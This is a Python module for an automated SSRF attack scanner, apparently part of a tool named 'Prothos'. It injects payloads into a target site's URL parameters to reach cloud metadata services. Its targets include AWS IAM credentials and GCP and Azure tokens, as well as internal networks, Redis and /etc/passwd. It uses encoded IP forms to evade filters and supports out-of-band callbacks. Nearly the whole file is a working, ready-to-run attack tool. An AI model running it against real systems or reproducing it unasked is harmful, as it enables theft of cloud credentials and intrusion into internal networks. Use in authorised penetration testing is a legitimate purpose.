import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

SSRF_PARAMS: list[str] = [
    "url", "uri", "path", "continue", "dest", "destination", "redirect",
    "redirect_uri", "redirect_url", "fetch", "load", "site", "html", "file",
    "page", "feed", "host", "port", "to", "out", "image", "img", "image_url",
    "imageurl", "source", "src", "target", "callback", "callback_url", "data",
    "domain", "proxy", "next", "open", "remote", "reference", "ref", "link",
]

TARGETS: list[dict] = [
    {"name": "AWS metadata (IMDSv1)",   "url": "http://169.254.169.254/latest/meta-data/",
     "patterns": [r"ami-id", r"instance-id", r"iam/", r"hostname", r"local-ipv4"],
     "severity": "critical"},
    {"name": "AWS IAM credentials",     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "patterns": [r"AccessKeyId", r"SecretAccessKey", r"Token", r"AssumeRole"],
     "severity": "critical"},
    {"name": "AWS user-data",           "url": "http://169.254.169.254/latest/user-data",
     "patterns": [r"#!/bin/", r"#cloud-config", r"export "],
     "severity": "critical"},
    {"name": "GCP metadata",            "url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
     "patterns": [r"computeMetadata", r"service-accounts", r"project-id", r"\"projectNumber\""],
     "severity": "critical"},
    {"name": "GCP token",               "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "patterns": [r"access_token", r"expires_in", r"token_type"],
     "severity": "critical"},
    {"name": "Azure IMDS",              "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "patterns": [r"compute", r"azEnvironment", r"vmId", r"subscriptionId"],
     "severity": "critical"},
    {"name": "Azure token",             "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     "patterns": [r"access_token", r"expires_on"],
     "severity": "critical"},
    {"name": "Alibaba metadata",        "url": "http://100.100.100.200/latest/meta-data/",
     "patterns": [r"instance-id", r"image-id", r"region-id"],
     "severity": "critical"},
    {"name": "DigitalOcean metadata",   "url": "http://169.254.169.254/metadata/v1.json",
     "patterns": [r"droplet_id", r"floating_ip", r"\"region\""],
     "severity": "critical"},
    {"name": "Localhost",               "url": "http://127.0.0.1/",
     "patterns": [r"<title>", r"Apache", r"nginx", r"It works"],
     "severity": "high"},
    {"name": "Localhost (alt)",         "url": "http://localhost/",
     "patterns": [r"<title>", r"Apache", r"nginx"],
     "severity": "high"},
    {"name": "Internal 192.168",        "url": "http://192.168.0.1/",
     "patterns": [r"<title>", r"login", r"router", r"admin"],
     "severity": "high"},
    {"name": "Internal 10.x",           "url": "http://10.0.0.1/",
     "patterns": [r"<title>", r"login", r"admin"],
     "severity": "high"},
    {"name": "Internal 172.16",         "url": "http://172.16.0.1/",
     "patterns": [r"<title>", r"login", r"admin"],
     "severity": "high"},
    {"name": "Redis",                   "url": "dict://127.0.0.1:6379/info",
     "patterns": [r"redis_version", r"connected_clients"],
     "severity": "high"},
    {"name": "File scheme",             "url": "file:///etc/passwd",
     "patterns": [r"root:.*?:0:0:"],
     "severity": "critical"},
]

BYPASS_HOSTS: list[str] = [
    "169.254.169.254", "0251.0376.0251.0376", "0xA9.0xFE.0xA9.0xFE",
    "2852039166", "0xA9FEA9FE", "[::ffff:169.254.169.254]",
    "169.254.169.254.nip.io", "metadata.google.internal", "①⑥⑨.254.169.254",
    "169。254。169。254",
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class SSRFFinding:
    url:        str
    param:      str
    target:     str
    payload:    str
    method:     str
    status:     int          = 0
    evidence:   str          = ""
    severity:   str          = "critical"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class SSRFReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    params:      list[str]           = field(default_factory=list)
    findings:    list[SSRFFinding]   = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def critical(self) -> list[SSRFFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True, safe=":/?#@[]")))


def _candidate_params(url: str, extra: Optional[list[str]]) -> list[str]:
    existing = list(parse_qs(urlparse(url).query).keys())
    params = [p for p in existing if p.lower() in SSRF_PARAMS]
    if extra:
        for p in extra:
            if p not in params:
                params.append(p)
    if not params:
        params = [p for p in existing] or ["url"]
    return params


def _match(body: str, patterns: list[str]) -> Optional[str]:
    for pat in patterns:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            return m.group(0)[:120]
    return None


async def _test_param(client, url, param, oob, sem) -> list[SSRFFinding]:
    findings = []
    async with sem:
        for tgt in TARGETS:
            try:
                r = await client.get(_set_param(url, param, tgt["url"]), timeout=12)
            except Exception:
                continue
            evidence = _match(r.text, tgt["patterns"])
            if evidence:
                f = SSRFFinding(url=url, param=param, target=tgt["name"],
                                payload=tgt["url"], method="param-fetch",
                                status=r.status_code, evidence=evidence,
                                severity=tgt["severity"])
                findings.append(f)
                _print_finding(f)

        for host in BYPASS_HOSTS:
            payload = f"http://{host}/latest/meta-data/"
            try:
                r = await client.get(_set_param(url, param, payload), timeout=12)
            except Exception:
                continue
            evidence = _match(r.text, [r"ami-id", r"instance-id", r"iam/", r"computeMetadata"])
            if evidence:
                f = SSRFFinding(url=url, param=param, target="Metadata (encoded bypass)",
                                payload=payload, method="bypass",
                                status=r.status_code, evidence=evidence,
                                severity="critical")
                findings.append(f)
                _print_finding(f)

        if oob:
            try:
                await client.get(_set_param(url, param, oob), timeout=8)
                f = SSRFFinding(url=url, param=param, target="OOB callback",
                                payload=oob, method="oob",
                                status=0, evidence="Request sent to OOB host, check interactsh for callback",
                                severity="high")
                findings.append(f)
                _print_finding(f)
            except Exception:
                pass

    return findings


def _print_finding(f: SSRFFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]{f.target}[/yellow]  "
        f"[dim]{f.evidence[:50]}[/dim]"
    )


def _display(report: SSRFReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]params:[/dim] {len(report.params)}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]",
        title="[bold red]SSRF Scan — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No SSRF found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Param",     style="bold white", width=14)
    table.add_column("Target",    style="cyan", width=26)
    table.add_column("Method",    style="magenta", width=12)
    table.add_column("Evidence",  style="yellow", min_width=25)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param, f.target, f.method, f.evidence[:40],
        )

    console.print(table)
    console.print()


async def _ssrf_async(target, extra_params, oob, concurrency, proxy) -> SSRFReport:
    report = SSRFReport(target=target)
    params = _candidate_params(target, extra_params)
    report.params = params
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Scanning SSRF...", total=len(params))
            tasks = [_test_param(client, target, p, oob, sem) for p in params]
            for coro in asyncio.as_completed(tasks):
                report.findings.extend(await coro)
                progress.advance(task_id, 1)

    report.findings.sort(key=lambda x: (
        {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.severity, 4)
    ))
    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_ssrf_scan(
    target:        str,
    params:        Optional[list[str]] = None,
    oob_url:       Optional[str]       = None,
    concurrency:   int                 = 8,
    proxy:         Optional[str]       = None,
    save_json:     Optional[str]       = None,
) -> SSRFReport:

    console.print(f"\n[bold red][*][/bold red] SSRF Scan → [bold white]{target}[/bold white]")
    detected = _candidate_params(target, params)
    console.print(f"[dim]    Params: {', '.join(detected)}  "
                  f"Targets: {len(TARGETS)}  "
                  f"OOB: {'on' if oob_url else 'off'}[/dim]")

    report = asyncio.run(_ssrf_async(
        target=target,
        extra_params=params,
        oob=oob_url,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
